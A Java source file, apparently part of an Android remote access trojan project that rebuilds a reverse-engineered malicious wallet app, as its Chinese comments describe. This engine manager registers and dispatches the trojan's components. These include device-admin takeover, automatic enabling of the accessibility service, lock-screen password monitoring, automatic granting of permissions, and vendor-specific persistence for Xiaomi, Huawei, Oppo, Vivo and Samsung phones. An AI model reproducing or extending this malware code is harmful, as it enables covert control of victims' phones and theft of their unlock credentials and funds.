package com.vendor.rat.service;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.engine.AccessibilityServiceEngine;
import com.vendor.rat.auto.engine.DeviceAdminEngine;
import com.vendor.rat.auto.engine.LockScreenMonitor;
import com.vendor.rat.auto.engine.PermissionAutoGrantEngine;
import com.vendor.rat.auto.engine.AospKeepAliveEngine;
import com.vendor.rat.auto.engine.vendor.HuaweiEngine;
import com.vendor.rat.auto.engine.vendor.OppoEngine;
import com.vendor.rat.auto.engine.vendor.VivoEngine;
import com.vendor.rat.auto.engine.vendor.XiaomiEngine;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 引擎管理器 (模块 02)
 *
 * 基于逆向分析: com/guard/wallet/service/AccessibilityDelegateManager.java (~800 行)
 *
 * ADAPT: vendor 中 AccessibilityDelegateManager 是 MyAccessibilityService 的基类 (extends AccessibilityService)
 * replica 中改为独立的组合类，由 MyAccessibilityService 持有引用，避免继承耦合
 *
 * 对齐 Vendor APK 的完整实现:
 *   - ConcurrentLinkedQueue 引擎队列 (对应 f209a)
 *   - 内容变化包名过滤 (对应 b)
 *   - 自定义事件包名过滤 (对应 c)
 *   - 唯一 ID 过滤 (对应 f210d)
 *   - 服务活跃标志 (对应 f214h)
 *   - 崩溃标志 (对应 f215i)
 *   - 引擎类型检查方法 (对应 f/g/h/i/m/n/o/p)
 *   - 引擎注册/注销方法 (对应 a/b/c/d/e)
 *   - 引擎停止方法 (对应 D)
 *   - 包名/唯一ID过滤方法 (对应 k/l/q/r/s/t/C)
 *   - 引擎移除方法 (对应 u/v/w/x/y/z/A/B)
 *   - 是否有活跃引擎 (对应 j)
 */
public class EngineManager {

    private static final String TAG = "EngineManager";

    // ADAPT: vendor 中 f208j 是静态常量 204832，用于自定义事件类型
    public static final Integer CUSTOM_EVENT_TYPE = 204832;

    private final MyAccessibilityService service;

    // ====== 引擎队列 — 对应逆向 f209a ======
    private final ConcurrentLinkedQueue<AutoEngine> engines = new ConcurrentLinkedQueue<>();

    // ====== 内容变化包名过滤 — 对应逆向 b ======
    private final ConcurrentLinkedQueue<String> contentChangedPackages = new ConcurrentLinkedQueue<>();

    // ====== 自定义事件包名过滤 — 对应逆向 c ======
    private final ConcurrentLinkedQueue<String> customEventPackages = new ConcurrentLinkedQueue<>();

    // ====== 唯一 ID 过滤 — 对应逆向 f210d ======
    private final ConcurrentLinkedQueue<String> uniqueIdFilter = new ConcurrentLinkedQueue<>();

    // ====== 服务活跃标志 — 对应逆向 f214h ======
    public final AtomicBoolean serviceActive = new AtomicBoolean(false);

    // ====== 崩溃标志 — 对应逆向 f215i ======
    public final AtomicBoolean crashed = new AtomicBoolean(false);

    public EngineManager(MyAccessibilityService service) {
        this.service = service;
    }

    // ============ 引擎注册 — 对齐逆向 ============

    /**
     * 根据设备品牌自动注册对应的厂商适配引擎
     * 基于逆向: 在 MyAccessibilityService.onCreate() 中根据 Build.MANUFACTURER 注册引擎
     *
     * ADAPT: vendor 中引擎注册分散在 b() 方法中，根据 utils.e 的品牌检测方法选择引擎
     * replica 中统一在此方法中注册
     */
    public void registerVendorEngines() {
        Log.d(TAG, "Detecting vendor: " + DeviceUtils.getBrandName());

        // 设备管理员引擎 — 所有厂商通用
        register(new DeviceAdminEngine());
        Log.d(TAG, "Registered DeviceAdminEngine");

        // 无障碍服务自动开启引擎 — 所有厂商通用
        register(new AccessibilityServiceEngine());
        Log.d(TAG, "Registered AccessibilityServiceEngine");

        // 锁屏密码监控 — 所有厂商通用 (被动监听)
        register(new LockScreenMonitor());
        Log.d(TAG, "Registered LockScreenMonitor");

        // 权限自动授予引擎 — 所有厂商通用 (被动监听)
        register(new PermissionAutoGrantEngine());
        Log.d(TAG, "Registered PermissionAutoGrantEngine");

        if (DeviceUtils.isXiaomi()) {
            register(new XiaomiEngine());
            Log.d(TAG, "Registered XiaomiEngine");
        } else if (DeviceUtils.isHuawei()) {
            register(new HuaweiEngine());
            Log.d(TAG, "Registered HuaweiEngine");
        } else if (DeviceUtils.isOppo()) {
            register(new OppoEngine());
            Log.d(TAG, "Registered OppoEngine");
        } else if (DeviceUtils.isVivo()) {
            register(new VivoEngine());
            Log.d(TAG, "Registered VivoEngine");
        } else if (DeviceUtils.isSamsung()) {
            register(new AospKeepAliveEngine());
            Log.d(TAG, "Registered AospKeepAliveEngine (Samsung)");
        } else {
            register(new AospKeepAliveEngine());
            Log.d(TAG, "Registered AospKeepAliveEngine");
        }
    }

    /**
     * 注册引擎
     * 对应逆向: f209a.add(engine)
     */
    public void register(AutoEngine engine) {
        try {
            engines.add(engine);
            Log.d(TAG, "Engine registered: " + engine.getEngineName());
        } catch (Exception e) {
            Log.e(TAG, "Engine register error", e);
        }
    }

    /**
     * 注册引擎并添加监听窗口过滤
     * 对应逆向: c(ListenWindow) — 查找已有引擎或创建新引擎
     */
    public AutoEngine registerWithWindow(AutoEngine engine, String packageName) {
        try {
            if (engine == null) return null;

            // 查找已有的同包名引擎
            AutoEngine existing = findByPackage(packageName);
            if (existing != null) {
                return existing;
            }

            engines.add(engine);
            return engine;
        } catch (Exception e) {
            Log.e(TAG, "registerWithWindow error", e);
            return null;
        }
    }

    /**
     * 注册引擎 (带窗口列表)
     * 对应逆向: d(String, List)
     */
    public AutoEngine registerWithWindows(AutoEngine engine, String packageName) {
        try {
            if (packageName == null || packageName.isEmpty()) {
                return null;
            }
            engines.add(engine);
            return engine;
        } catch (Exception e) {
            Log.e(TAG, "registerWithWindows error", e);
            return null;
        }
    }

    // ============ 引擎查找 — 对齐逆向 ============

    /**
     * 按包名查找引擎
     * 对应逆向: c() 中的 Objects.equals(eVar.f615a, packageName) 查找
     */
    public AutoEngine findByPackage(String packageName) {
        try {
            if (engines.isEmpty()) return null;
            for (AutoEngine engine : engines) {
                if (Objects.equals(engine.getPrimaryPackage(), packageName)) {
                    return engine;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "findByPackage error", e);
        }
        return null;
    }

    /**
     * 获取指定类型的引擎
     * 对应逆向: n() 模式 — 遍历队列查找 instanceof
     */
    @SuppressWarnings("unchecked")
    public <T extends AutoEngine> T getEngine(Class<T> clazz) {
        try {
            if (engines.isEmpty()) return null;
            for (AutoEngine engine : engines) {
                if (clazz.isInstance(engine)) {
                    return (T) engine;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getEngine error", e);
        }
        return null;
    }

    // ============ 引擎类型检查 — 对齐逆向 f/g/h/i/m/n/o/p ============

    /**
     * 检查是否存在指定类型的引擎
     * 对应逆向: f()/g()/h()/i()/m()/o()/p() — 遍历 f209a 检查 instanceof
     */
    public boolean hasEngine(Class<? extends AutoEngine> clazz) {
        try {
            if (engines.isEmpty()) return false;
            for (AutoEngine engine : engines) {
                if (clazz.isInstance(engine)) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "hasEngine error", e);
        }
        return false;
    }

    /**
     * 是否有任何活跃引擎
     * 对应逆向: j() — 检查所有引擎类型
     */
    public boolean hasAnyActiveEngine() {
        try {
            for (AutoEngine engine : engines) {
                if (engine.isRunning() && !engine.isFinished()) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "hasAnyActiveEngine error", e);
        }
        return false;
    }

    // ============ 引擎移除 — 对齐逆向 u/v/w/x/y/z/A/B ============

    /**
     * 移除指定类型的引擎
     * 对应逆向: u()/v()/w()/x()/y()/z()/A()/B() — removeIf 模式
     */
    public void removeEngine(Class<? extends AutoEngine> clazz) {
        try {
            if (engines.isEmpty()) return;
            engines.removeIf(engine -> {
                if (clazz.isInstance(engine)) {
                    engine.destroy();
                    return true;
                }
                return false;
            });
        } catch (Exception e) {
            Log.e(TAG, "removeEngine error", e);
        }
    }

    /**
     * 取消注册引擎
     */
    public void unregister(AutoEngine engine) {
        try {
            if (engines.remove(engine)) {
                engine.destroy();
                Log.d(TAG, "Engine unregistered: " + engine.getEngineName());
            }
        } catch (Exception e) {
            Log.e(TAG, "unregister error", e);
        }
    }

    /**
     * 取消所有引擎
     */
    public void unregisterAll() {
        try {
            for (AutoEngine engine : engines) {
                engine.destroy();
            }
            engines.clear();
            contentChangedPackages.clear();
            customEventPackages.clear();
            uniqueIdFilter.clear();
            Log.d(TAG, "All engines unregistered");
        } catch (Exception e) {
            Log.e(TAG, "unregisterAll error", e);
        }
    }

    /**
     * 停止所有引擎的代理
     * 对应逆向: D() — 遍历所有引擎类型并调用停止方法，然后移除
     */
    public void stopAllDelegates() {
        try {
            if (engines.isEmpty()) return;

            for (AutoEngine engine : engines) {
                try {
                    if (engine.isRunning()) {
                        engine.finish();
                    }
                } catch (Exception e) {
                    Log.e(TAG, "stopDelegate error: " + engine.getEngineName(), e);
                }
            }

            // 移除已完成的引擎
            engines.removeIf(engine -> engine.isFinished());
        } catch (Exception e) {
            Log.e(TAG, "stopAllDelegates error", e);
        }
    }

    // ============ 包名过滤 — 对齐逆向 k/l/q/r/s ============

    /**
     * 检查包名是否在内容变化监听列表中
     * 对应逆向: k(String)
     */
    public boolean isContentChangedPackage(String packageName) {
        try {
            if (packageName == null || packageName.isEmpty()) return false;
            return contentChangedPackages.contains(packageName);
        } catch (Exception e) {
            Log.e(TAG, "isContentChangedPackage error", e);
            return false;
        }
    }

    /**
     * 检查唯一 ID 是否在过滤列表中
     * 对应逆向: l(String)
     */
    public boolean isUniqueIdRegistered(String uniqueId) {
        try {
            if (uniqueId == null || uniqueId.isEmpty()) return false;
            if (uniqueIdFilter.contains(uniqueId)) return true;
            // 模糊匹配
            for (String id : uniqueIdFilter) {
                if (id != null && uniqueId.contains(id)) return true;
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "isUniqueIdRegistered error", e);
            return false;
        }
    }

    /**
     * 添加自定义事件包名
     * 对应逆向: q(String)
     */
    public void addCustomEventPackage(String packageName) {
        try {
            if (packageName == null || packageName.isEmpty()) return;
            if (!customEventPackages.contains(packageName)) {
                customEventPackages.offer(packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "addCustomEventPackage error", e);
        }
    }

    /**
     * 添加唯一 ID
     * 对应逆向: r(String)
     */
    public void addUniqueId(String uniqueId) {
        try {
            if (uniqueId == null || uniqueId.isEmpty()) return;
            if (!uniqueIdFilter.contains(uniqueId)) {
                uniqueIdFilter.offer(uniqueId);
            }
        } catch (Exception e) {
            Log.e(TAG, "addUniqueId error", e);
        }
    }

    /**
     * 添加内容变化包名
     * 对应逆向: s(String)
     */
    public void addContentChangedPackage(String packageName) {
        try {
            if (packageName == null || packageName.isEmpty()) return;
            if (!contentChangedPackages.contains(packageName)) {
                contentChangedPackages.offer(packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "addContentChangedPackage error", e);
        }
    }

    // ============ 监听窗口注册 — 对齐逆向 t/C ============

    /**
     * 注册监听窗口的包名过滤
     * 对应逆向: t(String, List) — 遍历 ListenWindow 列表注册包名
     */
    public void registerWindowFilters(String engineName, List<AutoEngine.WindowMatcher> matchers) {
        if (matchers == null || matchers.isEmpty()) return;
        try {
            for (AutoEngine.WindowMatcher matcher : matchers) {
                if (matcher != null) {
                    if (matcher.getEventTypes() != null && !matcher.getEventTypes().isEmpty()
                            && matcher.getEventTypes().contains(2048)) {
                        addContentChangedPackage(matcher.getPackageName());
                    }
                    if (matcher.getEventTypes() != null && !matcher.getEventTypes().isEmpty()
                            && matcher.getEventTypes().contains(CUSTOM_EVENT_TYPE)) {
                        addCustomEventPackage(matcher.getPackageName());
                    }
                    // 生成唯一 ID
                    String uniqueId = buildUniqueId(matcher.getPackageName(),
                            matcher.getClassName(), engineName);
                    addUniqueId(uniqueId);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "registerWindowFilters error", e);
        }
    }

    /**
     * 注销监听窗口的包名过滤
     * 对应逆向: C(String, List)
     */
    public void unregisterWindowFilters(String engineName, List<AutoEngine.WindowMatcher> matchers) {
        if (matchers == null || matchers.isEmpty()) return;
        try {
            for (AutoEngine.WindowMatcher matcher : matchers) {
                if (matcher != null) {
                    if (matcher.getEventTypes() != null && !matcher.getEventTypes().isEmpty()
                            && matcher.getEventTypes().contains(2048)) {
                        String pkg = matcher.getPackageName();
                        if (pkg != null && !pkg.isEmpty()) {
                            contentChangedPackages.remove(pkg);
                        }
                    }
                    if (matcher.getEventTypes() != null && !matcher.getEventTypes().isEmpty()
                            && matcher.getEventTypes().contains(CUSTOM_EVENT_TYPE)) {
                        String pkg = matcher.getPackageName();
                        if (pkg != null && !pkg.isEmpty()) {
                            customEventPackages.remove(pkg);
                        }
                    }
                    String uniqueId = buildUniqueId(matcher.getPackageName(),
                            matcher.getClassName(), engineName);
                    if (uniqueId != null && !uniqueId.isEmpty()) {
                        uniqueIdFilter.remove(uniqueId);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "unregisterWindowFilters error", e);
        }
    }

    // ============ 事件分发 — 对齐逆向 ============

    /**
     * 分发事件到匹配的引擎
     * 对应逆向: f0() 中的引擎遍历分发逻辑
     */
    public void dispatchEvent(String packageName, String className,
                              AccessibilityEvent event) {
        int eventType = event.getEventType();

        try {
            if (!engines.isEmpty()) {
                for (AutoEngine engine : engines) {
                    try {
                        if (engine.isFinished()) continue;

                        if (engine.matchWindow(packageName, className, eventType)) {
                            engine.onAccessibilityEvent(event, packageName, className);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Engine dispatch error: "
                            + engine.getEngineName(), e);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "dispatchEvent error", e);
        }
    }

    /**
     * 通知根节点变化到匹配的引擎
     * 对应逆向: h0(String, String, String, boolean)
     */
    public boolean notifyRootChanged(String packageName, String className,
                                     String windowTitle, boolean isComplete) {
        boolean matched = false;
        try {
            if (engines.isEmpty()) return false;
            Iterator<AutoEngine> it = engines.iterator();
            while (it.hasNext()) {
                try {
                    AutoEngine engine = it.next();
                    if (engine != null) {
                        if (engine.matchWindow(packageName, className)) {
                            if (!engine.isRunning()) {
                                // ADAPT: vendor 调用 eVar.w(true) 设置活跃状态
                            }
                            // ADAPT: vendor 调用 eVar.v(root, isComplete, pkg, cls, title)
                            matched = true;
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "notifyRootChanged error", e);
                    return matched;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "notifyRootChanged error", e);
        }
        return matched;
    }

    /**
     * 启动所有已注册引擎的主逻辑
     */
    public void startAllEngines() {
        for (AutoEngine engine : engines) {
            if (!engine.isFinished() && !engine.isRunning()) {
                engine.start();
            }
        }
    }

    // ============ 工具方法 ============

    /**
     * 构建唯一 ID
     * 对应逆向: g.v0(packageName, className, engineName)
     */
    public static String buildUniqueId(String packageName, String className, String engineName) {
        StringBuilder sb = new StringBuilder();
        if (packageName != null) sb.append(packageName);
        sb.append("/");
        if (className != null) sb.append(className);
        sb.append("/");
        if (engineName != null) sb.append(engineName);
        return sb.toString();
    }

    // ============ Getters ============

    public MyAccessibilityService getService() { return service; }
    public List<AutoEngine> getEngines() { return new ArrayList<>(engines); }
    public int getEngineCount() { return engines.size(); }
    public ConcurrentLinkedQueue<String> getContentChangedPackages() { return contentChangedPackages; }
    public ConcurrentLinkedQueue<String> getCustomEventPackages() { return customEventPackages; }
    public ConcurrentLinkedQueue<String> getUniqueIdFilter() { return uniqueIdFilter; }
}
